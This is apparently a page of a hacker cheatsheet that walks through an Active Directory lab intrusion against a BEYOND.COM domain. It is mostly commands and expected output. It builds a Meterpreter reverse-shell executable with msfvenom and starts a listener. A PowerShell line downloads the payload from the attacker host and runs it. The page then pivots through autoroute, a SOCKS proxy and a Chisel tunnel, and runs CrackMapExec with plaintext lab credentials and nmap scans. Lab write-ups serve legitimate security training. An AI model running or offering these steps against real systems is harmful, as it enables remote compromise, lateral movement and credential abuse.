# Services and Sessions

Custom query to display all active sessions
>``` shell
>MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
>```

Display all active sessions in the BEYOND.COM domain
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Services-and-Sessions-1.png)

Display all kerberoastable user accounts in the BEYOND.COM domain
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Services-and-Sessions-2.png)

SPN of the user account daniela
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Services-and-Sessions-3.png)

Creating a Meterpreter reverse shell executable file
>``` shell
>kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
>
># ========== Expected Result ==========
>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
>[-] No arch selected, selecting arch: x64 from the payload
>No encoder specified, outputting raw payload
>Payload size: 510 bytes
>Final size of exe file: 7168 bytes
>Saved as: met.exe
># =====================================
>```

Starting Metasploit listener on port 443
>``` shell
>kali@kali:~/beyond$ sudo msfconsole -q
>
>msf6 > use multi/handler
>
># ========== Expected Result ==========
>[*] Using configured payload generic/shell_reverse_tcp
># =====================================
>
>msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
>
># ========== Expected Result ==========
>payload => windows/x64/meterpreter/reverse_tcp
># =====================================
>
>msf6 exploit(multi/handler) > set LHOST 192.168.119.5
>
># ========== Expected Result ==========
>LHOST => 192.168.119.5
># =====================================
>
>msf6 exploit(multi/handler) > set LPORT 443
>
># ========== Expected Result ==========
>LPORT => 443
># =====================================
>
>msf6 exploit(multi/handler) > set ExitOnSession false
>
># ========== Expected Result ==========
>ExitOnSession => false
># =====================================
>
>msf6 exploit(multi/handler) > run -j
>
># ========== Expected Result ==========
>[*] Exploit running as background job 0.
>[*] Exploit completed, but no session was created.
>[*] Started HTTPS reverse handler on https://192.168.119.5:443
># =====================================
>```

Downloading and executing Meterpreter reverse shell
>``` shell
>PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
>
>PS C:\Users\marcus> .\met.exe
>```

Incoming session in Metasploit
>``` shell
>[*] Meterpreter session 1 opened (192.168.119.5:443 -> 192.168.50.242:64234) at 2022-10-11 07:05:22 -0400
>```

Creating a SOCKS5 proxy to access the internal network from our Kali machine
>``` shell
>msf6 exploit(multi/handler) > use multi/manage/autoroute
>
>msf6 post(multi/manage/autoroute) > set session 1
>
># ========== Expected Result ==========
>session => 1
># =====================================
>
>msf6 post(multi/manage/autoroute) > run
>
># ========== Expected Result ==========
>[!] SESSION may not be compatible with this module:
>[!]  * incompatible session platform: windows
>[*] Running module against CLIENTWK1
>[*] Searching for subnets to autoroute.
>[+] Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
>[*] Post module execution completed
># =====================================
>
>msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
>
>msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
>
># ========== Expected Result ==========
>SRVHOST => 127.0.0.1
># =====================================
>
>msf6 auxiliary(server/socks_proxy) > set VERSION 5
>
># ========== Expected Result ==========
>VERSION => 5
># =====================================
>
>msf6 auxiliary(server/socks_proxy) > run -j
>
># ========== Expected Result ==========
>[*] Auxiliary module running as background job 2.
># =====================================
>```

proxychains configuration file settings
>``` shell
>kali@kali:~/beyond$ cat /etc/proxychains4.conf
>
># ========== Expected Result ==========
>...
>socks5  127.0.0.1 1080
># =====================================
>```

Enumerating SMB with CrackMapExec and proxychains
>``` shell
>kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
>
># ========== Expected Result ==========
>SMB         172.16.6.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
>SMB         172.16.6.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
>SMB         172.16.6.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
>SMB         172.16.6.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
>SMB         172.16.6.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
>SMB         172.16.6.240    445    DCSRV1           [+] Enumerated shares
>SMB         172.16.6.240    445    DCSRV1           Share           Permissions     Remark
>SMB         172.16.6.240    445    DCSRV1           -----           -----------     ------
>SMB         172.16.6.240    445    DCSRV1           ADMIN$                          Remote Admin
>SMB         172.16.6.240    445    DCSRV1           C$                              Default share
>SMB         172.16.6.240    445    DCSRV1           IPC$            READ            Remote IPC
>SMB         172.16.6.240    445    DCSRV1           NETLOGON        READ            Logon server share 
>SMB         172.16.6.240    445    DCSRV1           SYSVOL          READ            Logon server share 
>SMB         172.16.6.241    445    INTERNALSRV1     [+] Enumerated shares
>SMB         172.16.6.241    445    INTERNALSRV1     Share           Permissions     Remark
>SMB         172.16.6.241    445    INTERNALSRV1     -----           -----------     ------
>SMB         172.16.6.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
>SMB         172.16.6.241    445    INTERNALSRV1     C$                              Default share
>SMB         172.16.6.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
>SMB         172.16.6.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
>SMB         172.16.6.254    445    MAILSRV1         [+] Enumerated shares
>SMB         172.16.6.254    445    MAILSRV1         Share           Permissions     Remark
>SMB         172.16.6.254    445    MAILSRV1         -----           -----------     ------
>SMB         172.16.6.254    445    MAILSRV1         ADMIN$                          Remote Admin
>SMB         172.16.6.254    445    MAILSRV1         C$                              Default share
>SMB         172.16.6.254    445    MAILSRV1         IPC$            READ            Remote IPC
># =====================================
>```

Using Nmap to perform a port scan on ports 21, 80, and 443
>``` shell
>kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
>
># ========== Expected Result ==========
>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 07:17 EDT
>Nmap scan report for 172.16.6.240
>Host is up (2.2s latency).
>
>PORT    STATE  SERVICE
>21/tcp  closed ftp
>80/tcp  closed http
>443/tcp closed https
>
>Nmap scan report for internalsrv1.beyond.com (172.16.6.241)
>Host is up (0.21s latency).
>
>PORT    STATE  SERVICE
>21/tcp  closed ftp
>80/tcp  open   http
>443/tcp open   https
>
>Nmap scan report for 172.16.6.254
>Host is up (0.20s latency).
>
>PORT    STATE  SERVICE
>21/tcp  closed ftp
>80/tcp  open   http
>443/tcp closed https
>
>Nmap done: 3 IP addresses (3 hosts up) scanned in 14.34 seconds
># =====================================
>```

Setting up Chisel on Kali to access the Web Server on INTERNALSRV1 via Browser
>``` shell
>kali@kali:~/beyond$ chmod a+x chisel
>
>kali@kali:~/beyond$ ./chisel server -p 8080 --reverse
>
># ========== Expected Result ==========
>2022/10/11 07:20:46 server: Reverse tunnelling enabled
>2022/10/11 07:20:46 server: Fingerprint UR6ly2hYyr8iefMfm+gK5mG1R06nTKJF0HV+2bAws6E=
>2022/10/11 07:20:46 server: Listening on http://0.0.0.0:8080
># =====================================
>```

Uploading Chisel to CLIENTWK1 via our Meterpreter session
>``` shell
>msf6 auxiliary(server/socks_proxy) > sessions -i 1
>
># ========== Expected Result ==========
>[*] Starting interaction with 1...
># =====================================
>
>meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
>
># ========== Expected Result ==========
>[*] Uploading  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
>[*] Uploaded 7.85 MiB of 7.85 MiB (100.0%): /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
>[*] Completed  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
># =====================================
>```

Utilizing Chisel to set up a reverse port forwarding to port 80 on INTERNALSRV1
>``` shell
>C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
>
># ========== Expected Result ==========
>2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
>2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
># =====================================
>```

WordPress page on INTERNALSRV1 (172.16.6.241)
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Services-and-Sessions-4.png)

Failed Redirect to the Administrator Login
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Services-and-Sessions-5.png)

Contents of /etc/hosts
>``` shell
>kali@kali:~/beyond$ cat /etc/hosts      
>
># ========== Expected Result ==========
>127.0.0.1       localhost
>127.0.1.1       kali
>...
>127.0.0.1    internalsrv1.beyond.com
>...
># =====================================
>```

Administrator Login of Wordpress on INTERNALSRV1
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Services-and-Sessions-6.png)
